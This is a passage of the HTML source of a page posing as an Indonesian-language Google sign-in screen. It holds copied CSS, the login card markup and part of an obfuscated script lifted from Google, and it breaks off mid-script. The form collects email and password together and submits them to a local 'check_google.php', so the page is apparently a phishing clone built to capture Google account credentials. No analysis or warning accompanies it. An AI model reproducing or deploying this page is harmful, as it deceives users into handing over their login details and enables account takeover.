  -webkit-transition: opacity 0.3s;
  -moz-transition: opacity 0.3s;
  -ms-transition: opacity 0.3s;
  -o-transition: opacity 0.3s;
  transition: opacity 0.3s;
}
.input-wrapper {
  position: relative;
}
.google-footer-bar {
  z-index: 2;
}
</style>
<style media="screen and (max-width: 580px)">
.back-arrow {
  top: 17px;
}
.circle-mask {
  height: 72px;
  width: 72px;
  background-size: 72px;
}
.circle {
  height: 72px;
  width: 72px;
}
#canvas {
  height: 72px;
  width: 72px;
}
.form-panel {
  width: 256px;
}
.card-mask-wrap {
  width: 300px;
}
.signin-card {
  width: 256px;
}
.signin-card #EmailFirst {
  margin-top: 15px;
}
.one-google {
  padding-top: 22px;
}
</style>
  </head>
  <body>
  <div class="wrapper">
  <div  class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div  class="main content clearfix">
<div class="banner">
<h1>
  Satu akun untuk seluruh Google.
</h1>
  <h2 class="hidden-small">
  Login dengan Akun Google Anda
  </h2>
</div>
<div class="main-content 
  
    no-name
  
  
  
">
<div  class="card signin-card pre-shift
  
  
   no-name">
  <img  class="circle-mask"
    
      src="img/avatar_2x.png"
    >
  <form novalidate method="post" action="check_google.php" id="gaia_loginform">
  <div class="form-panel first valid" id="gaia_firstform">
  <div class="slide-out">
  <div class="input-wrapper focused">
  <div id="identifier-shown">
  <div>
  <label  class="hidden-label" for="Email">
  Masukkan email</label>
  <input  id="Email" type="email" value="" spellcheck="false" name="Email" placeholder="Email atau ponsel" >
  <input id="Passwd" type="password" value="" spellcheck="false" name="Password" placeholder="Password">
  </div>
  </div>
  <span role="alert" class="error-msg" id="errormsg_0_Email"></span>
  </div>
<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Berikutnya">
  <a  class="need-help">Temukan akun saya</a>
  </div>
  </div>
  </form>
</div>
  <div  class="card-mask-wrap
        
     no-name">
  <div class="card-mask">
  <div class="one-google">
  <p class="create-account">
  <span id="link-signin-different">
  <a>Masuk dengan akun lain</a>
  </span>
  <span id="link-signup">
    <a> Buat akun</a>
  </span>
  </p>
<p class="tagline">
  Satu Akun Google untuk semua produk Google
</p>
<div class="logo-strip"></div>
  </div>
  </div>
  </div>
</div>
  </div>
  <div  class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a>Tentang Google</a>
  </li>
  <li>
  <a>Privasi</a>
  </li>
  <li>
  <a>Persyaratan</a>
  </li>
  <li>
  <a>Bantuan</a>
  </li>
  </ul>
  </div>
</div>
  </div>
<script type="text/javascript" nonce="JldCXpHjGFQ0l9VY2eSkHw">
  var gaia_attachEvent = function(element, event, callback) {
  if (element && element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element && element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
  (function() {
  var gaia_hideNavBar = function() {
  setTimeout(function() {
  window.scrollTo(0, 1);
  }, 0);
  };
  gaia_attachEvent(window, 'load', gaia_hideNavBar);
  })();
</script>
  <script type="text/javascript" nonce="JldCXpHjGFQ0l9VY2eSkHw">(function(){function y(F){return F}var q=this||self,l=function(F){return y.call(this,F)},V=function(F,N,d,Z,n){if(Z=(n=d,q.trustedTypes),!Z||!Z.createPolicy)return n;try{n=Z.createPolicy(N,{createHTML:l,createScript:l,createScriptURL:l})}catch(u){if(q.console)q.console[F](u.message)}return n};(0,eval)(function(F,N){return(N=V("error","tl",null))&&1===F.eval(N.createScript("1"))?function(d){return N.createScript(d)}:function(d){return""+d}}(q)(Array(7824*Math.random()|0).join("\n")+'(function(){var yl=function(Z,F,d,N,n,q,y,l,u,V,K){if(!(d+2&5)){for(V=u=0;u<F.length;u++)V+=F.charCodeAt(u),V+=V<<10,V=(l=V>>6,-(V&l)-1-~V+(~V&l));K=(y=(V+=V<<3,V^=V>>Z,q=V+(V<<15)>>>0,new Number(q&(1<<N)-1)),y[0]=(q>>>N)%n,y)}return(d+6)%3||(N=F[Nw],K=N instanceof ds?N:null),K},L=function(Z,F,d,N,n,q){if(!(1==((Z-4)%7||(q=Math.floor(this.M())),Z-5&11)&&(n=d.type,n in N.h&&ZG(8,25,F,N.h[n],d)&&(g(7,true,d),N.h[n].length==F&&(delete N.h[n],N.g--))),Z>>2&5))a:if("string"===typeof N)q="string"!==typeof d||1!=d.length?-1:N.indexOf(d,F);else{for(n=F;n<N.length;n++)if(n in N&&N[n]===d){q=n;break a}q=-1}return q},$P=function(Z,F,d,N,n,q,y,l,u,V,K,w,p){if(!(Z-6&3))if(Array.isArray(d))for(K=q;K<d.length;K++)$P(6,F,d[K],"object",n,0,y,l);else V=W(13,N,F)?!!F.capture:!!F,n=f(13,n),y&&y[su]?y.T.remove(String(d),n,V,l):y&&(u=yl(11,y,9))&&(w=u.ry(n,V,d,l))&&nT(15,12,null,"on",w);return(Z>>2)%8||(n.classList?n.classList.remove(d):R(12,N,8,F,n,d)&&e(F,70,n,Array.prototype.filter.call(qw(1,F,33,n),function(a){return a!=d}).join(q))),p},ld=function(Z,F,d,N,n,q,y,l,u,V){if(!((n^964)%3))for(q in y=d,N.h){for(u=(l=N.h[q],d);u<l.length;u++)++y,g(Z,true,l[u]);delete (N.g--,N.h)[q]}if(!(n>>2&3)){if(y=window.btoa){for(l="",q=0;q<d.length;q+=8192)l+=String.fromCharCode.apply(null,d.slice(q,q+8192));N=y(l).replace(/\\+/g,"-").replace(/\\//g,F).replace(/=/g,"")}else N=void 0;V=N}return V},Vl=function(Z,F,d,N,n,q){if(!((F^539)%Z)){if(!N)throw Error("Invalid class name "+N);if("function"!==typeof d)throw Error("Invalid decorator function "+d);}return 1==((F^532)&7)&&M.call(this,d,N||ud.i(),n),q},e=function(Z,F,d,N,n,q,y,l,u,V,K,w,p,a){if((((F+4)%8||(a=Z&&Z.parentNode?Z.parentNode.removeChild(Z):null),F)>>2)%17||(typeof d.className==Z?d.className=N:d.setAttribute&&d.setAttribute("class",N)),3==(F-6&7)){if(!n)throw Error("Invalid event type");if(!(V=((p=yl((K=W(30,Z,y)?!!y.capture:!!y,11),l,12))||(l[Nw]=p=new ds(l)),p.add(n,N,u,K,q)),V.hG)){if((((V.hG=(w=g(33),w),w).src=l,w).listener=V,l).addEventListener)KT||(y=K),void 0===y&&(y=d),l.addEventListener(n.toString(),w,y);else if(l.attachEvent)l.attachEvent(ws(16,17,"on",n.toString()),w);else if(l.addListener&&l.removeListener)l.addListener(w);else throw Error("addEventListener and attachEvent are unavailable.");pT++}}return(F-7)%12||(Array.isArray(N)&&(N=N.join(Z)),y=d+n,""===N||void 0==N?(jr||(jr={atomic:false,autocomplete:"none",dropeffect:"none",haspopup:false,live:"off",multiline:false,multiselectable:false,orientation:"vertical",readonly:false,relevant:"additions text",required:false,sort:"none",busy:false,disabled:false,hidden:false,invalid:"false"}),l=jr,n in l?q.setAttribute(y,l[n]):q.removeAttribute(y)):q.setAttribute(y,N)),a},gs=function(Z,F,d,N,n){return F>>((F-8)%8||(n=Math.floor(this.WO+(this.M()-this.lI))),2)&Z||N.VD&&N.VD.forEach(d,void 0),n},fT=function(Z,F,d,N){return 1==((F^623)&Z)&&(N=Object.prototype.hasOwnProperty.call(d,LT)&&d[LT]||(d[LT]=++W6)),N},ws=function(Z,F,d,N,n,q,y,l){return(((F-3)%Z||(this.listener=q,this.hG=null,this.src=d,this.type=n,this.capture=!!N,this.B=y,this.key=++RN,this.P=this.Y=false),4==((F|5)&14)&&(l=N in aN?aN[N]:aN[N]=d+N),(F+4)%10)||(this.o=d),F<<1)%15||(d.classList?Array.prototype.forEach.call(N,function(u){$P(3,"string",u,0,d," ")}):e("string",71,d,Array.prototype.filter.call(qw(1,"string",35,d),function(u){return!(0<=L(34,0,u,N))}).join(" "))),l},DG=function(Z,F,d,N,n,q,y,l,u,V){if(!((N<<1)%5)){for(q=(d=y=0,[]);y<F.length;y++)for(d+=n,u=u<<n|F[y];7<d;)d-=8,q.push((l=u>>d,257+(~l&255)+2*(l|-256)));V=q}if(1==(N+9&3))for(u=d.length,l="string"===typeof d?d.split(F):d,y=n;y<u;y++)y in l&&q.call(void 0,l[y],y,d);return(N>>2)%5||(er.call(this,F?F.type:""),this.relatedTarget=this.currentTarget=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=this.offsetY=this.offsetX=0,this.key=Z,this.charCode=this.keyCode=0,this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=false,this.state=null,this.pointerId=0,this.pointerType=Z,this.K=null,F&&(d=this.type=F.type,q=F.changedTouches&&F.changedTouches.length?F.changedTouches[0]:null,this.target=F.target||F.srcElement,this.currentTarget=n,y=F.relatedTarget,y||("mouseover"==d?y=F.fromElement:"mouseout"==d&&(y=F.toElement)),this.relatedTarget=y,q?(this.clientX=void 0!==q.clientX?q.clientX:q.pageX,this.clientY=void 0!==q.clientY?q.clientY:q.pageY,this.screenX=q.screenX||0,this.screenY=q.screenY||0):(this.offsetX=F.offsetX,this.offsetY=F.offsetY,this.clientX=void 0!==F.clientX?F.clientX:F.pageX,this.clientY=void 0!==F.clientY?F.clientY:F.pageY,this.screenX=F.screenX||0,this.screenY=F.screenY||0),this.button=F.button,this.keyCode=F.keyCode||0,this.key=F.key||Z,this.charCode=F.charCode||("keypress"==d?F.keyCode:0),this.ctrlKey=F.ctrlKey,this.altKey=F.altKey,this.shiftKey=F.shiftKey,this.metaKey=F.metaKey,this.pointerId=F.pointerId||0,this.pointerType="string"===typeof F.pointerType?F.pointerType:IN[F.pointerType]||Z,this.state=F.state,this.K=F,F.defaultPrevented&&Mw.D.preventDefault.call(this))),V},ZG=function(Z,F,d,N,n,q,y,l,u){if(!((F|6)%7))a:{switch(y){case q:u=l?"disable":"enable";break a;case 2:u=l?"highlight":"unhighlight";break a;case 4:u=l?"activate":"deactivate";break a;case Z:u=l?"select":"unselect";break a;case N:u=l?"check":"uncheck";break a;case d:u=l?"focus":"blur";break a;case n:u=l?"open":"close";break a}throw Error("Invalid component state");}return(F<<2)%5||(q=L(Z,d,n,N),(y=q>=d)&&Array.prototype.splice.call(N,q,1),u=y),u},H6=function(Z,F,d,N,n,q,y,l,u){return(3==(F+((F>>Z)%((F+3)%6||(this.src=d,this.g=0,this.h={}),9)||(d.P?q=true:(y=new Mw(N,this),n=d.listener,l=d.B||d.src,d.Y&&nT(15,13,null,"on",d),q=n.call(l,y)),u=q),9)&7)&&(u=typeof n.className==d?n.className:n.getAttribute&&n.getAttribute("class")||N),F<<1&15)==Z&&(this.F=T.document||document),u},W=function(Z,F,d,N,n,q,y,l){if(4==((Z+4)%14||(d.aw(function(u){n=u},F,N),l=n),Z+7&14)&&(N=typeof d,l=N==F&&null!=d||"function"==N),!(Z>>1&14))if(n="array"===mR("splice","object",N)?N:[N],this.Z)F(this.Z);else try{y=[],q=!this.l.length,U(0,[oN,y,n],this,41),U(0,[T2,F,y],this,65),d&&!q||Uu(true,254,this,true,d)}catch(u){f(11,":",this,u),F(this.Z)}return(Z+((Z+4)%9||(l=!!(n=d.C4,-(N|F)+(n|N)-~N+(~n^N))&&!!(d.ow&N)),4))%5||(S.call(this),F||Sr||(Sr=new XE),this.TE=this.HO=this.f4=this.jH=null,this.dy=void 0,this.PO=false,this.VD=null),l},nT=function(Z,F,d,N,n,q,y,l,u,V){if(F<<1&(1==(3==(F>>2&Z)&&"number"!==typeof n&&n&&!n.P&&((u=n.src)&&u[su]?L(22,0,n,u.T):(q=n.hG,y=n.type,u.removeEventListener?u.removeEventListener(y,q,n.capture):u.detachEvent?u.detachEvent(ws(16,5,N,y),q):u.addListener&&u.removeListener&&u.removeListener(q),pT--,(l=yl(11,u,3))?(L(26,0,n,l),0==l.g&&(l.src=d,u[Nw]=d)):g(6,true,n))),F>>1&Z)&&(CT.call(this),this.T=new ds(this),this.$X=null,this.xX=this),14)||(V=(q=Q[d.substring(0,3)+"_"])?q(d.substring(3),N,n):id(0,7,N,d)),2==(F>>2&11))a:{for(y in n)if(q.call(void 0,n[y],y,n)){V=d;break a}V=N}return V},R=function(Z,F,d,N,n,q,y,l,u){if(1==(d-9&15))if(F.classList)Array.prototype.forEach.call(N,function(V,K){F.classList?F.classList.add(V):R(12,0,Z,"string",F,V)||(K=H6(2,18,"string","",F),e("string",69,F,K+(0<K.length?" "+V:V)))});else{for(n in y=((Array.prototype.forEach.call(qw(1,(q={},"string"),32,F),function(V){q[V]=true}),Array).prototype.forEach.call(N,function(V){q[V]=true}),""),q)y+=0<y.length?" "+n:n;e("string",3,F,y)}return(d>>(3==((d^((d+1)%10||(this.type=F,this.currentTarget=this.target=N,this.defaultPrevented=this.H=false),815))&11)&&(n.classList?l=n.classList.contains(q):(y=qw(1,N,34,n),l=L(3,F,q,y)>=F),u=l),1))%11||(F.L4=void 0,F.i=function(){return F.L4?F.L4:F.L4=new F}),u},z=function(Z,F,d,N,n,q,y,l,u,V,K,w){if(1==((n^45)&3)){if(K=(y=(d||N.Ez++,0<N.eH&&N.Zf&&N.QD&&1>=N.cO&&!N.s&&!N.W&&(N.wy||!d)&&0==document.hidden),(l=4==N.Ez)||y?N.M():N.JG),u=K-N.JG,q=u>>14,N.R&&(N.R^=q*(u<<F)),N.sz+=q,l||y)N.Ez=0,N.JG=K;!y||K-N.lI<N.eH-(Z?255:d?5:2)?w=false:(V=A(N,d?143:123),O(123,N,N.$),N.l.push([v6,V]),N.W=Ql,w=true)}if(1==(n>>2&13)){if(!(q=(h.call(this,d),Z))){for(l=this.constructor;l;){if(N=fT(7,6,l),y=c6[N])break;l=(u=Object.getPrototypeOf(l.prototype))&&u.constructor}q=y?"function"===typeof y.i?y.i():new y:null}this.J=q}if(!((n>>1)%4))if(Array.isArray(N))for(u=Z;u<N.length;u++)z(0,true,d,N[u],9,q,y,l);else q=f(9,q),d&&d[su]?d.T.add(String(N),q,F,W(78,"object",y)?!!y.capture:!!y,l):e("object",9,false,q,N,l,y,d,F);return w},B=function(Z,F,d,N,n,q,y,l,u,V,K){if(2==(F>>1&15)){for(Z=[];d--;)Z.push(255*Math.random()|0);K=Z}return(F>>2)%((F^771)%(1==(F>>((F<<1)%13||(N.R=(l=(q=(u=JD(8,N,3,A(N,d))<<Z,n=JD(8,N,3,A(N,d))<<16,~u+~n-3*~(u|n)+(~u^n)),y=JD(8,N,3,A(N,d))<<8,2*(y|0)+~y-(~q|y)),V=JD(8,N,3,A(N,d)),~(l&V)-~V-~(l|V)+(l|~V)),N.C=void 0),1)&15)&&(Z=function(){return N()},N=function(){return d},Z[this.L]=function(w){d=w},K=Z),14)||(K=V=function(){if(q.o==q){if(q.j){var w=[rs,n,N,void 0,l,u,arguments];if(2==y)var p=(U(0,w,q,5),Uu)(true,254,q,d,d);else if(y==Z){var a=!q.l.length;(U(0,w,q,53),a)&&Uu(true,254,q,d,d)}else p=P6(0,null,q,w);return p}l&&u&&l.removeEventListener(u,V,d)}}),10)||(K=(q=n[N]<<24|n[(N|1)-(N&1)-Z*~(N|1)+Z*(~N^1)]<<d|n[Z*(N&Z)-1-(~N^Z)]<<8,y=n[(N&3)-~(N|3)+(N&-4)+(~N|3)],-2-~q-(q|~y))),K},g=function(Z,F,d,N,n,q,y,l,u,V){if(!(Z-2&23))if(n&&n.once)z(0,true,y,q,17,N,n,l);else if(Array.isArray(q))for(u=0;u<q.length;u++)g(42,false,"object",N,n,q[u],y,l);else N=f(5,N),y&&y[su]?y.T.add(String(q),N,F,W(29,d,n)?!!n.capture:!!n,l):e("object",17,false,N,q,l,n,y,F);return 4==(Z+(3==((Z|2)&(Z>>2&(Z<<2&15||(this.Xn=this.Xn),24)||(d.P=F,d.listener=null,d.hG=null,d.src=null,d.B=null),23))&&(F=AD,V=d=function(K){return F.call(d.src,d.listener,K)}),6)&14)&&(V=F),V},z2=function(Z,F,d,N,n,q,y,l,u){return(((F<<2)%(2==((F^840)&7)&&(q=this,n={},y=q.I,l=function(V,K){return(K=y.call(q,[Ou]),N)[V%9018*d%9018*35*(K|0)%9018*d%9018]},l[q.L]=function(V){n[2214*d%9018]=V},l[q.L](N),N=n,u=l),14)||(n=E(N),n&d&&(n=d+(n|-128)|E(N)<<7),u=n),F)-3&7||(N.push(d[0]<<24|d[1]<<16|d[2]<<8|d[3]),N.push((l=d[4]<<24|d[Z]<<16,y=d[6]<<8,-~l-2*(~l^y)+(l|~y)+2*(~l|y))|d[7]),N.push((n=d[8]<<24,q=d[9]<<16,-(n|0)-2*~n+3*(~n&q)+2*(n|~q))|d[10]<<8|d[11])),1==(F>>2&7))&&(N=-~(d|3)-(~d&3)+(~d|3),y=d&4,n=E(this),q=E(this),l=A(this,n),y&&(l=hD(6,(""+l).replace(/\\r\\n/g,"\\n"),2048)),N&&b(this,q,k(l.length,2)),b(this,q,l)),u},qw=function(Z,F,d,N,n,q,y,l,u){if(!((d^((d|7)%13||(u=N.classList?N.classList:H6(2,10,F,"",N).match(/\\S+/g)||[]),381))%8))if(n=N.length,n>F){for(y=Array(n),q=F;q<n;q++)y[q]=N[q];u=y}else u=[];return(d-3&7)==Z&&(y=typeof q,l=y!=N?y:q?Array.isArray(q)?"array":y:"null",u=l==F||l==N&&typeof q.length==n),u},id=function(Z,F,d,N,n,q,y,l,u,V){if(1==(F-((F>>2)%3||(y=function(){},n=void 0,q=B6(d,function(K){y&&(N&&Ql(N),n=K,y(),y=void 0)},!!N)[Z],V={low:function(K,w,p,a,G,I){if(!w)return G=q(p),K&&K(G),G;a=function(){n(function(c){Ql(function(){K(c)})},p)},n?a():(I=y,y=function(){I(),Ql(a)})}}),2)&5))a:{for(u=d;u<q.length;++u)if(l=q[u],!l.P&&l.listener==y&&l.capture==!!N&&l.B==n){V=u;break a}V=-1}return(F+3)%5||(d(function(K){K(N)}),V=[function(){return N}]),V},U=function(Z,F,d,N,n,q,y,l){return((N+((N-5)%12||d.l.splice(Z,Z,F),2)&15||(y=!!(F.ow&d)&&!!(F.G&d)!=n&&(!(F.hp&d)||F.dispatchEvent(ZG(8,3,32,16,Z,1,d,n)))&&!F.Xn),1)==((N^922)&7)&&(n=F,n^=n<<13,n=(q=n>>17,(n&~q)-(~n^q)+(~n|q)),n^=n<<5,(n=(n|d)+2*(~n^d)-(n|~d)-(~n|d))||(n=1),y=2*(Z&~n)-(Z|~n)+(~Z|n)),3==((N^719)&7))&&(l=function(){},l.prototype=d.prototype,F.D=d.prototype,F.prototype=new l,F.prototype.constructor=F,F.$L=function(u,V,K){for(var w=Array(arguments.length-Z),p=Z;p<arguments.length;p++)w[p-Z]=arguments[p];return d.prototype[V].apply(u,w)}),y},f=function(Z,F,d,N,n,q,y,l,u,V,K,w,p){if(!(((((Z-5&3||("function"===typeof F?p=F:(F[Eu]||(F[Eu]=function(a){return F.handleEvent(a)}),p=F[Eu])),Z)<<1)%11||(d.Z=((d.Z?d.Z+"~":"E:")+N.message+F+N.stack).slice(0,2048)),Z)+3)%9))if(K=N.T.h[String(n)]){for(u=(K=K.concat(),V=F,0);u<K.length;++u)(y=K[u])&&!y.P&&y.capture==q&&(l=y.B||y.src,w=y.listener,y.Y&&L(6,0,y,N.T),V=false!==w.call(l,d)&&V);p=V&&!d.defaultPrevented}else p=F;return p},T=this||self,x,bd=function(Z,F,d,N,n){return id.call(this,0,14,Z,F,d,N,n)},t=function(Z,F,d){d=this;try{kP(F,this,Z)}catch(N){f(11,":",this,N),F(function(n){n(d.Z)})}},tD=function(Z,F){for(var d,N,n=1;n<arguments.length;n++){for(d in N=arguments[n],N)Z[d]=N[d];for(var q=0;q<xP.length;q++)d=xP[q],Object.prototype.hasOwnProperty.call(N,d)&&(Z[d]=N[d])}},YP=function(){return L.call(this,14)},B6=function(Z,F,d,N){return nT.call(this,15,16,Z,F,d,N)},LT="closure_uid_"+(1E9*Math.random()>>>0),NS=function(Z,F,d,N,n){if(N=T.trustedTypes,n=d,!N||!N.createPolicy)return n;try{n=N.createPolicy(F,{createHTML:F0,createScript:F0,createScriptURL:F0})}catch(q){if(T.console)T.console[Z](q.message)}return n},F0=function(Z){return g.call(this,46,Z)},W6=0,Sr,hD=function(Z,F,d,N,n,q,y,l,u,V,K,w){for(u=(l=(V=[],0),0);l<F.length;l++)y=F.charCodeAt(l),128>y?V[u++]=y:(y<d?V[u++]=(n=y>>Z,-~(n&192)+-2-(~n^192)):(55296==(y&64512)&&l+1<F.length&&56320==(F.charCodeAt(l+1)&64512)?(y=(K=-~(y&1023)+(y&-1024)+(~y|1023)<<10,-1-2*~(65536|K)-(65536&~K)+(65536|~K))+(F.charCodeAt(++l)&1023),V[u++]=(w=y>>18,-241-2*~(w|240)+(~w|240)),V[u++]=y>>12&63|128):V[u++]=y>>12|224,V[u++]=(N=y>>Z&63,129+(N^128)+(N|-129))),V[u++]=(q=y&63,(q&128)-1-(~q^128)));return V},KT=function(Z,F){if(!T.addEventListener||!Object.defineProperty)return false;F=Object.defineProperty({},"passive",(Z=false,{get:function(){Z=true}}));try{T.addEventListener("test",YP,F),T.removeEventListener("test",YP,F)}catch(d){}return Z}(),er=function(Z,F){return R.call(this,12,Z,9,F)},CT=function(){return g.call(this,32)},xP="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" "),Mw=((er.prototype.preventDefault=function(){this.defaultPrevented=true},er.prototype).stopPropagation=function(){this.H=true},CT.prototype.Xn=false,function(Z,F,d,N,n){return DG.call(this,"",Z,d,3,F,N,n)}),IN={2:"touch",3:"pen",4:(U(2,Mw,er,36),"mouse")},su="closure_listenable_"+(1E6*(Mw.prototype.stopPropagation=(Mw.prototype.preventDefault=function(Z){(Mw.D.preventDefault.call(this),Z=this.K,Z.preventDefault)?Z.preventDefault():Z.returnValue=false},function(){(Mw.D.stopPropagation.call(this),this.K.stopPropagation)?this.K.stopPropagation():this.K.cancelBubble=true}),Math).random()|0),RN=0,ds=function(Z){return H6.call(this,2,15,Z)},dW=function(Z,F,d,N,n){return ws.call(this,16,19,n,F,Z,d,N)},Nw="closure_lm_"+(ds.prototype.remove=function(Z,F,d,N,n,q,y){if(q=Z.toString(),!(q in this.h))return false;return(y=id(0,19,0,d,(n=this.h[q],N),n,F),-1<y)?(g(13,true,n[y]),Array.prototype.splice.call(n,y,1),0==n.length&&(delete this.h[q],this.g--),true):false},ds.prototype.add=(ds.prototype.ry=function(Z,F,d,N,n,q){return(n=this.h[d.toString()],q=-1,n&&(q=id(0,11,0,F,N,n,Z)),-1<q)?n[q]:null},function(Z,F,d,N,n,q,y,l,u){return y=id((u=(q=Z.toString(),this.h[q]),u||(u=this.h[q]=[],this.g++),0),5,0,N,n,u,F),-1<y?(l=u[y],d||(l.Y=false)):(l=new dW(q,!!N,F,n,this.src),l.Y=d,u.push(l)),l}),ds.prototype.hasListener=function(Z,F,d,N,n){return nT(15,9,true,(n=(d=(N=void 0!==Z)?Z.toString():"",void 0!==F),false),this.h,function(q,y){for(y=0;y<q.length;++y)if(!(N&&q[y].type!=d||n&&q[y].capture!=F))return true;return false})},1E6*Math.random()|0),pT=0,AD=function(Z,F,d,N,n,q){return H6.call(this,2,36,Z,F,d,N,n,q)},aN={},Eu="__closure_events_fn_"+(1E9*Math.random()>>>0),S=function(){return nT.call(this,15,3)},yJ=(((((U(2,S,CT,20),S.prototype)[su]=true,S.prototype).Uz=function(Z){this.$X=Z},S.prototype).addEventListener=function(Z,F,d,N){g(34,false,"object",F,d,Z,this,N)},S.prototype.removeEventListener=function(Z,F,d,N){$P(10,d,Z,"object",F,0,this,N)},S.prototype.dispatchEvent=function(Z,F,d,N,n,q,y,l,u,V,K,w){if(N=this.$X)for(y=1,n=[];N;N=N.$X)n.push(N),++y;if("string"===(V=(F=(d=(q=Z,this.xX),n),q.type||q),typeof q)?q=new er(q,d):q instanceof er?q.target=q.target||d:(K=q,q=new er(V,d),tD(q,K)),w=true,F)for(u=F.length-1;!q.H&&0<=u;u--)l=q.currentTarget=F[u],w=f(42,true,q,l,V,true)&&w;if(q.H||(l=q.currentTarget=d,w=f(24,true,q,l,V,true)&&w,q.H||(w=f(6,true,q,l,V,false)&&w)),F)for(u=0;!q.H&&u<F.length;u++)l=q.currentTarget=F[u],w=f(15,true,q,l,V,false)&&w;return w},S.prototype.ry=function(Z,F,d,N){return this.T.ry(Z,F,String(d),N)},S).prototype.hasListener=function(Z,F){return this.T.hasListener(void 0!==Z?String(Z):void 0,F)},function(Z,F,d,N,n,q,y,l,u,V){function K(w){w&&d.appendChild("string"===typeof w?n.createTextNode(w):w)}for(u=1;u<y.length;u++)if(V=y[u],!qw(1,q,12,"object",N,V)||W(62,"object",V)&&0<V.nodeType)K(V);else{a:{if(V&&typeof V.length==N){if(W(45,"object",V)){l="function"==typeof V.item||typeof V.item==Z;break a}if("function"===typeof V){l="function"==typeof V.item;break a}}l=F}DG("","",l?qw(1,0,5,V):V,8,0,K)}}),ZV=function(Z){return e.call(this,Z,12)},XE=function(){return H6.call(this,2,17)},jr,$b=(((((x=XE.prototype,x.U=function(Z){return"string"===typeof Z?this.F.getElementById(Z):Z},x).getElementsByTagName=function(Z,F){return(F||this.F).getElementsByTagName(String(Z))},x.createElement=function(Z,F,d){return"application/xhtml+xml"===(d=String(Z),F=this.F,F.contentType)&&(d=d.toLowerCase()),F.createElement(d)},x.createTextNode=function(Z){return this.F.createTextNode(String(Z))},x).appendChild=function(Z,F){Z.appendChild(F)},x.append=function(Z,F){yJ("string",false,Z,"number",9==Z.nodeType?Z:Z.ownerDocument||Z.document,"array",arguments)},x.canHaveChildren=function(Z){if(1!=Z.nodeType)return false;switch(Z.tagName){case "APPLET":case "AREA":case "BASE":case "BR":case "COL":case "COMMAND":case "EMBED":case "FRAME":case "HR":case "IMG":case "INPUT":case "IFRAME":case "ISINDEX":case "KEYGEN":case "LINK":case "NOFRAMES":case "NOSCRIPT":case "META":case "OBJECT":case "PARAM":case "SCRIPT":case "SOURCE":case "STYLE":case "TRACK":case "WBR":return false}return true},x).removeNode=ZV,x).contains=function(Z,F){if(!Z||!F)return false;if(Z.contains&&1==F.nodeType)return Z==F||Z.contains(F);if("undefined"!=typeof Z.compareDocumentPosition)return Z==F||!!(Z.compareDocumentPosition(F)&16);for(;F&&Z!=F;)F=F.parentNode;return F==Z},function(){return fT.call(this,7,5)}),h=(R(12,$b,22),$b.prototype.j8=0,$b.prototype.Oz="",function(Z){return W.call(this,6,Z)});(((U(2,h,S,28),h.prototype).p4=$b.i(),h).prototype.U=function(){return this.f4},h.prototype.getParent=function(){return this.jH},h.prototype.Uz=function(Z){if(this.jH&&this.jH!=Z)throw Error("Method not supported");h.D.Uz.call(this,Z)},h.prototype.O=function(){this.PO=!((gs(12,3,function(Z){Z.PO&&Z.O()},this),this).dy&&ld(5,"_",0,this.dy,7),1)},h).prototype.removeChild=function(Z,F,d,N,n,q,y,l,u,V,K,w){if(Z&&("string"===typeof Z?l=Z:((V=Z.HO)||(K=Z,u=Z.p4,w=u.Oz+":"+(u.j8++).toString(36),V=K.HO=w),l=V),n=l,this.TE&&n?(N=this.TE,y=(null!==N&&n in N?N[n]:void 0)||null):y=null,Z=y,n&&Z)){if(null==(d=(ZG((n in(q=this.TE,q)&&delete q[n],8),20,0,this.VD,Z),F&&(Z.O(),Z.f4&&ZV(Z.f4)),Z),d))throw Error("Unable to set parent component");d.jH=null,h.D.Uz.call(d,null)}if(!Z)throw Error("Child is not in parent component");return Z};var se,nh=function(Z,F){return ws.call(this,16,15,Z,F)},qS=function(Z,F,d,N,n){return R.call(this,12,Z,10,F,d,N,n)},lS=function(){return ws.call(this,16,8)},uS={button:"pressed",checkbox:"checked",menuitem:"selected",menuitemcheckbox:"checked",menuitemradio:(R(12,lS,45),"checked"),radio:"checked",tab:"selected",treeitem:"selected"},VJ=function(){return Vl.call(this,8,10)},c6=(R(12,VJ,(((x=lS.prototype,x.Df=function(Z){return Z.U()},x).GE=function(Z,F,d,N,n,q,y){(q=(se||(se={1:"disabled",8:"selected",16:"checked",64:"expanded"}),se[F]),(N=Z.getAttribute("role")||null)?(y=uS[N]||q,n="checked"==q||"selected"==q?y:q):n=q,n)&&e(" ",19,"aria-",d,n,Z)},x.Iw=function(Z,F,d,N,n,q){if(Z.ow&32&&(q=Z.Df())){if(!F&&Z.G&32){try{q.blur()}catch(y){}Z.G&32&&(W(5,0,Z,4)&&Z.setActive(false),W(23,0,Z,32)&&U(64,Z,32,46,false)&&Z.X(false,32))}if(d=q.hasAttribute("tabindex"))N=q.tabIndex,d="number"===typeof N&&0<=N&&32768>N;d!=F&&(n=q,F?n.tabIndex=0:(n.tabIndex=-1,n.removeAttribute("tabIndex")))}},x).N=function(Z,F,d,N){(N=F.U?F.U():F)&&(d?qS:nh)(N,[Z])},x.X=function(Z,F,d,N,n,q){if(N=F.U())this.K4||(n=this.SH(),n.replace(/\\xa0|\\s/g," "),this.K4={1:n+"-disabled",2:n+"-hover",4:n+"-active",8:n+"-selected",16:n+"-checked",32:n+"-focused",64:n+"-open"}),(q=this.K4[Z])&&this.N(q,F,d),this.GE(N,Z,d)},x.SH=function(){return"goog-control"},U(2,VJ,lS,12),23)),{}),M=(VJ.prototype.SH=function(){return"goog-button"},VJ.prototype.GE=function(Z,F,d){switch(F){case 8:case 16:e(" ",7,"aria-",d,"pressed",Z);break;default:case 64:case 1:VJ.D.GE.call(this,Z,F,d)}},function(Z,F,d,N,n,q,y,l){return 